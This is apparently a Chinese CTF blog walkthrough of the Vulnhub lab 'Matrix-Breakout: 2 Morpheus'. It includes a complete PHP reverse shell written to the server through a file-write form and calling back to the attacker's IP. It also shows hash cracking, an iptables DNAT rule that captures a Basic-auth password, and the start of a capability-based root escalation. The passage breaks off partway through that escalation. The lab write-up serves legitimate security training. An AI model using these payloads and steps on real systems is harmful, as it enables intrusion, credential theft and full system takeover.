---
title: Matrix-Breakout: 2 Morpheus
author: hgbe02
date: 2024-07-08 18:30:00 +0800
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Matrix-Breakout2Morpheus.html"
---

# Matrix-breakout2-morpheus

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407081853683.png" alt="image-20240707173808588" style="zoom:50%;" />

> 注意改靶机需要采用vmware进行操作！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407081853684.png" alt="image-20240708142755764" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali㉿kali)-[~/morpheus]
└─$ sudo rustscan -a $IP -- -A -sCV -Pn
[sudo] password for kali: 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.146.128:80
Open 192.168.146.128:81
Open 192.168.146.128:22

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOWNDAE21hrPYFpJ4+PvruHbth1s+HHqXYEKk12tnsBQE90v34m4qITkv/TFumnzT24uw98ntLc2QnqC1lH3rVA=
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.51 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Morpheus:1
81/tcp open  http    syn-ack ttl 64 nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Meeting Place
MAC Address: 00:0C:29:1C:23:31 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 5.0 - 5.5 (99%), Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (96%), Sony X75CH-series Android TV (Android 5.0) (95%), Linux 3.1 (95%), Linux 3.2 (95%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=7/8%OT=22%CT=%CU=42132%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=668B877E%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5B4ST11NW6%O6=M5B4ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 44.021 days (since Sat May 25 01:59:30 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 192.168.146.128
```

### 目录扫描

```bash
┌──(kali㉿kali)-[~/morpheus]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP -f -x php,bak,zip,html.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.146.128
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,bak,zip,html.txt
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html.txt/           (Status: 403) [Size: 280]
/.php/                (Status: 403) [Size: 280]
/icons/               (Status: 403) [Size: 280]
/javascript/          (Status: 403) [Size: 280]
/graffiti.php/        (Status: 200) [Size: 451]
/.php/                (Status: 403) [Size: 280]
/.html.txt/           (Status: 403) [Size: 280]
/server-status/       (Status: 403) [Size: 280]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

```bash
┌──(kali㉿kali)-[~/morpheus]
└─$ curl -v http://$IP                            
*   Trying 192.168.146.128:80...
* Connected to 192.168.146.128 (192.168.146.128) port 80
> GET / HTTP/1.1
> Host: 192.168.146.128
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Mon, 08 Jul 2024 06:30:31 GMT
< Server: Apache/2.4.51 (Debian)
< Last-Modified: Thu, 28 Oct 2021 06:24:12 GMT
< ETag: "15c-5cf63c252ab85"
< Accept-Ranges: bytes
< Content-Length: 348
< Vary: Accept-Encoding
< Content-Type: text/html
< 
<html>
        <head><title>Morpheus:1</title></head>
        <body>
                Welcome to the Boot2Root CTF, Morpheus:1.
                <p>
                You play Trinity, trying to investigate a computer on the 
                Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.
                <p>
                Good luck!

                - @jaybeale from @inguardians
                <p>
                <img src="trinity.jpeg">
        </body>
</html>
* Connection #0 to host 192.168.146.128 left intact

┌──(kali㉿kali)-[~/morpheus]
└─$ curl -v http://$IP:81
*   Trying 192.168.146.128:81...
* Connected to 192.168.146.128 (192.168.146.128) port 81
> GET / HTTP/1.1
> Host: 192.168.146.128:81
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 401 Unauthorized
< Server: nginx/1.18.0
< Date: Mon, 08 Jul 2024 06:33:35 GMT
< Content-Type: text/html
< Content-Length: 179
< Connection: keep-alive
< WWW-Authenticate: Basic realm="Meeting Place"
< 
<html>
<head><title>401 Authorization Required</title></head>
<body>
<center><h1>401 Authorization Required</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
* Connection #0 to host 192.168.146.128 left intact
```

![image-20240708143429179](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407081853686.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407081853687.png" alt="image-20240708143455070" style="zoom:50%;" />

### 敏感目录

扫到了几个敏感目录，尝试查看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407081853688.png" alt="image-20240708143839956" style="zoom:50%;" />

打开源代码发现存在一个同名的`.txt`文件：

```bash
<form method="post">
<label>Message</label><div><input type="text" name="message"></div>
<input type="hidden" name="file" value="graffiti.txt">
<div><button type="submit">Post</button></div>
</form>

```

```bash
http://192.168.146.128/graffiti.txt
Mouse here - welcome to the Nebby!

Make sure not to tell Morpheus about this graffiti wall.
It's just here to let us blow off some steam.
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407081853689.png" alt="image-20240708164851546" style="zoom:50%;" />

发现出现在了`php`页面上，所以可以尝试写入反弹shell到新文件

### 上传反弹shell

尝试一下抓包：

```bash
POST /graffiti.php HTTP/1.1
Host: 192.168.146.128
Content-Length: 32
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.146.128
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.146.128/graffiti.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

message=whoami&file=graffiti.txt
```

尝试上传反弹shell！

```bash
POST /graffiti.php HTTP/1.1
Host: 192.168.146.128
Content-Length: 4062
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.146.128
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.146.128/graffiti.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

message=<?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '192.168.146.131';  // You have changed this
  $port = 1234;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";}}?>&file=revshell.php
```

尝试上传即可：

![image-20240708165403560](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407081853690.png)

尝试访问`http://192.168.146.128/revshell.php`进行激活：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407081853691.png" alt="image-20240708165625619" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@morpheus:/var/www$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Oct 28  2021 .
drwxr-xr-x 13 root     root     4096 Oct 28  2021 ..
drwxr-xr-x  2 www-data www-data 4096 Jul  8 08:53 html
(remote) www-data@morpheus:/var/www$ cd html
(remote) www-data@morpheus:/var/www/html$ ls -la
total 448
drwxr-xr-x 2 www-data www-data   4096 Jul  8 08:53 .
drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
-rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
-rw-r--r-- 1 www-data www-data    770 Oct 28  2021 graffiti.php
-rw-r--r-- 1 www-data www-data   4047 Jul  8 08:51 graffiti.txt
-rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
-rw-r--r-- 1 www-data www-data   4037 Jul  8 08:53 revshell.php
-rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
-rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
```

发现了一个隐藏文件。

### 隐藏文件分析

运气不错，以来就找到了好东西！！！

```bash
┌──(kali㉿kali)-[~/temp/morpheus]
└─$ stegseek .cypher-neo.png 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file ".cypher-neo.png" is not supported.

┌──(kali㉿kali)-[~/temp/morpheus]
└─$ binwalk .cypher-neo.png  

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 853 x 480, 8-bit/color RGBA, non-interlaced
138           0x8A            Zlib compressed data, best compression
```

### 第二波信息搜集

没东西，尝试继续信息搜集一下：

```bash
(remote) www-data@morpheus:/var/nginx/html$ cat .htpasswd 
cypher:$apr1$e9o8Y7Om$5zgDW6WOO6Fl8rCC7jpvX0
```

尝试进行爆破一下：

```bash
┌──(kali㉿kali)-[~/temp/morpheus]
└─$ echo 'cypher:$apr1$e9o8Y7Om$5zgDW6WOO6Fl8rCC7jpvX0' > hash

┌──(kali㉿kali)-[~/temp/morpheus]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash    
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:57 DONE (2024-07-08 05:09) 0g/s 243734p/s 243734c/s 243734C/s !!!0mc3t..*7¡Vamos!
Session completed.
```

发现没成功，继续搜集一波信息。

```bash
(remote) www-data@morpheus:/$ cat FLAG.txt 
Flag 1!

You've gotten onto the system.  Now why has Cypher locked everyone out of it?

Can you find a way to get Cypher's password? It seems like he gave it to 
Agent Smith, so Smith could figure out where to meet him.

Also, pull this image from the webserver on port 80 to get a flag.

/.cypher-neo.png
```

嘶，这个找到的顺序咋不对啊。。。。

```bash
(remote) www-data@morpheus:/$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@morpheus:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/umount
/usr/bin/chfn
/usr/sbin/xtables-legacy-multi
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
(remote) www-data@morpheus:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nginx:x:999:999:nginx:/var/nginx:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
uuidd:x:102:102::/run/uuidd:/usr/sbin/nologin
tcpdump:x:103:103::/nonexistent:/usr/sbin/nologin
_chrony:x:104:104:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
systemd-network:x:105:106:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:106:107:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
trinity:x:1000:1000::/home/trinity:/bin/bash
cypher:x:1001:1001::/home/cypher:/bin/bash
(remote) www-data@morpheus:/$ cd /home/cypher/
bash: cd: /home/cypher/: Permission denied
(remote) www-data@morpheus:/$ cd /home/trinity/
(remote) www-data@morpheus:/home/trinity$ ls -la
total 20
drwxr-xr-x 2 trinity trinity 4096 Oct 28  2021 .
drwxr-xr-x 4 root    root    4096 Oct 28  2021 ..
-rw-r--r-- 1 trinity trinity  220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 trinity trinity 3526 Aug  4  2021 .bashrc
-rw-r--r-- 1 trinity trinity  807 Aug  4  2021 .profile
(remote) www-data@morpheus:/home/trinity$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/python3-9 cap_sys_admin=ep
/usr/bin/ping cap_net_raw=ep
/usr/sbin/xtables-legacy-multi cap_net_admin=ep
/usr/sbin/xtables-nft-multi cap_net_admin=ep
```

发现了具有admin权限，参考https://gtfobins.github.io/gtfobins/python/#capabilities

看看能不能执行：

```bash
(remote) www-data@morpheus:/home/trinity$ /usr/bin/python3-9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
bash: /usr/bin/python3-9: Permission denied
(remote) www-data@morpheus:/home/trinity$ ls -la /usr/bin/python3-9
-rwxr-x--- 1 root humans 5479736 Oct 28  2021 /usr/bin/python3-9
```

看来先得拿到`humans`权限。。。。。

```bash
(remote) www-data@morpheus:/home$ find / -user humans 2>/dev/null | grep -v proc
(remote) www-data@morpheus:/home$ find / -group humans 2>/dev/null | grep -v proc
/usr/bin/python3-9
/crew
(remote) www-data@morpheus:/home$ ls -la /crew
total 8
drwxrwxr-x  2 root humans 4096 Oct 28  2021 .
drwxr-xr-x 19 root root   4096 Oct 28  2021 ..
(remote) www-data@morpheus:/home$ cat /etc/passwd | grep 'humans'
```

毛都没有，尝试进一步信息搜集，想起来前面那个81端口了，不知道有无隐藏信息，尝试搜索一下：

```bash
(remote) www-data@morpheus:/etc/nginx/sites-enabled$ cat default 
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
server {
        listen 81 default_server;
        listen [::]:81 default_server;

        # SSL configuration
        #
        # listen 443 ssl default_server;
        # listen [::]:443 ssl default_server;
        #
        # Note: You should disable gzip for SSL traffic.
        # See: https://bugs.debian.org/773332
        #
        # Read up on ssl_ciphers to ensure a secure configuration.
        # See: https://bugs.debian.org/765782
        #
        # Self signed certs generated by the ssl-cert package
        # Don't use them in a production server!
        #
        # include snippets/snakeoil.conf;

        root /var/nginx/html;

        auth_basic "Meeting Place";
        auth_basic_user_file /var/nginx/html/.htpasswd;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }

        # pass PHP scripts to FastCGI server
        #
        #location ~ \.php$ {
        #       include snippets/fastcgi-php.conf;
        #
        #       # With php-fpm (or other unix sockets):
        #       fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        #       # With php-cgi (or other tcp sockets):
        #       fastcgi_pass 127.0.0.1:9000;
        #}

        # deny access to .htaccess files, if Apache's document root
        # concurs with nginx's one
        #
        #location ~ /\.ht {
        #       deny all;
        #}
}


# Virtual Host configuration for example.com
#
# You can move that to a different file under sites-available/ and symlink that
# to sites-enabled/ to enable it.
#
#server {
#       listen 80;
#       listen [::]:80;
#
#       server_name example.com;
#
#       root /var/www/example.com;
#       index index.html;
#
#       location / {
#               try_files $uri $uri/ =404;
#       }
#}
```

发现了basic认证密码文件，爆破不出来密码，上传pspy64，但是报段错误了，尝试继续搜集一下，上传`linpeas.sh`，也报错：

```bash
(remote) www-data@morpheus:/var/tmp$ ./linpeas.sh 
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...
./linpeas.sh: 292: search_for_regex: not found

./linpeas.sh: 296: Syntax error: "else" unexpected
(remote) www-data@morpheus:/var/tmp$ /tmp/lpspy64 
Segmentation fault
```

手动探测：

```bash
(remote) www-data@morpheus:/var/tmp$ ss -atlup
Netid         State          Recv-Q         Send-Q                 Local Address:Port                    Peer Address:Port         Process         
udp           UNCONN         0              0                          127.0.0.1:323                          0.0.0.0:*                            
udp           UNCONN         0              0                            0.0.0.0:bootpc                       0.0.0.0:*                            
udp           UNCONN         0              0                              [::1]:323                             [::]:*                            
tcp           LISTEN         0              4096                       127.0.0.1:32939                        0.0.0.0:*                            
tcp           LISTEN         0              511                          0.0.0.0:81                           0.0.0.0:*                            
tcp           LISTEN         0              128                          0.0.0.0:ssh                          0.0.0.0:*                            
tcp           LISTEN         0              511                                *:http                               *:*                            
tcp           LISTEN         0              511                             [::]:81                              [::]:*                            
tcp           LISTEN         0              128                             [::]:ssh                             [::]:*                            
(remote) www-data@morpheus:/var/tmp$ curl -is 0.0.0.0:81
HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0
Date: Mon, 08 Jul 2024 10:22:35 GMT
Content-Type: text/html
Content-Length: 179
Connection: keep-alive
WWW-Authenticate: Basic realm="Meeting Place"

<html>
<head><title>401 Authorization Required</title></head>
<body>
<center><h1>401 Authorization Required</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
```

### 流量转发获取basic认证

发现果然需要进行认证。。。。。我这里没思路了，看了一下群主视频，发现和一个防火墙流量转发有关：

```bash
(remote) www-data@morpheus:/$ iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy DROP)
target     prot opt source               destination         
DOCKER-USER  all  --  anywhere             anywhere            
DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         

Chain DOCKER (1 references)
target     prot opt source               destination         

Chain DOCKER-ISOLATION-STAGE-1 (1 references)
target     prot opt source               destination         
DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere            
RETURN     all  --  anywhere             anywhere            

Chain DOCKER-ISOLATION-STAGE-2 (1 references)
target     prot opt source               destination         
DROP       all  --  anywhere             anywhere            
RETURN     all  --  anywhere             anywhere            

Chain DOCKER-USER (1 references)
target     prot opt source               destination         
RETURN     all  --  anywhere             anywhere  
(remote) www-data@morpheus:/$ ls -la /usr/sbin/iptables
lrwxrwxrwx 1 root root 26 Oct 11  2021 /usr/sbin/iptables -> /etc/alternatives/iptables
```

而且阔以修改，所以采用修改路由进行转发，普通用户一般是无法修改这种文件的：

```bash
iptables -A PREROUTING -t nat -i docker0 -p tcp --dport 81 -j DNAT --to 172.17.0.1:1234
```

- `iptables`: 这是调用iptables工具的命令。
- `-A PREROUTING`: 这个选项告诉iptables将此规则添加到`PREROUTING`链中。`PREROUTING`链是数据包进入本机后、路由决策之前的第一个处理点，适用于进行目的地址的NAT（DNAT）。
- `-t nat`: 这个选项指定了要操作的表是`nat`表。iptables支持多个表，每个表包含一系列的链和规则，用于处理不同类型的网络流量。`nat`表专门用于地址转换。
- `-i docker0`: 这个选项指定了规则应用于哪个网络接口。在这个例子中，规则仅适用于通过`docker0`接口接收的数据包。`docker0`是Docker默认的桥接网络接口，用于容器之间的通信。
- `-p tcp`: 这个选项指定了规则适用于哪种协议的数据包。在这个例子中，规则仅适用于TCP协议的数据包。
- `--dport 81`: 这个选项进一步指定了规则适用的目标端口。在这个例子中，规则仅适用于目标端口为81的数据包。
- `-j DNAT`: 这个选项指定了当数据包匹配规则时要执行的动作。`DNAT`（目的网络地址转换）意味着将数据包的目的地址或端口号进行转换。
- `--to 172.17.0.1:1234`: 这个选项指定了`DNAT`动作的目标地址和端口号。在这个例子中，目标地址被更改为`172.17.0.1`，目标端口被更改为1234。这意味着所有原本目标为`docker0`接口、端口81的TCP数据包都将被重定向到`172.17.0.1`的1234端口。

然后就能得到认证的base64了：

```bash
(remote) www-data@morpheus:/$ nc -lp 1234
GET / HTTP/1.1
Host: 172.17.0.1:81
User-Agent: Go-http-client/1.1
Authorization: Basic Y3lwaGVyOmNhY2hlLXByb3N5LXByb2NlZWRzLWNsdWUtZXhwaWF0ZS1hbW1vLXB1Z2lsaXN0
Accept-Encoding: gzip

(remote) www-data@morpheus:/$ echo 'Y3lwaGVyOmNhY2hlLXByb3N5LXByb2NlZWRzLWNsdWUtZXhwaWF0ZS1hbW1vLXB1Z2lsaXN0' | base64 -d
cypher:cache-prosy-proceeds-clue-expiate-ammo-pugilist
```

得到密码，进行登录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407081853692.png" alt="image-20240708183632875" style="zoom:50%;" />

### python3-9 cap_sys_admin提权

参考 https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_admin

```bash
cypher@morpheus:~$ cat /etc/group | grep 'humans'
humans:x:1002:cypher,trinity
```

和`humans`具有一样的组权限，尝试提权：

```bash
cypher@morpheus:~$ cd ~
cypher@morpheus:~$ ls -la
total 24
drwx------ 2 cypher cypher 4096 Nov 29  2021 .
drwxr-xr-x 4 root   root   4096 Oct 28  2021 ..
-rw------- 1 cypher cypher  220 Aug  4  2021 .bash_logout
-rw------- 1 cypher cypher 3526 Aug  4  2021 .bashrc
-rw------- 1 cypher cypher  807 Aug  4  2021 .profile
-rw------- 1 cypher cypher   81 Oct 28  2021 FLAG.txt
cypher@morpheus:~$ cat FLAG.txt 
You've clearly gained access as user Cypher.

Can you find a way to get to root?
cypher@morpheus:~$ cp /etc/passwd ./
cypher@morpheus:~$ openssl passwd -1 root
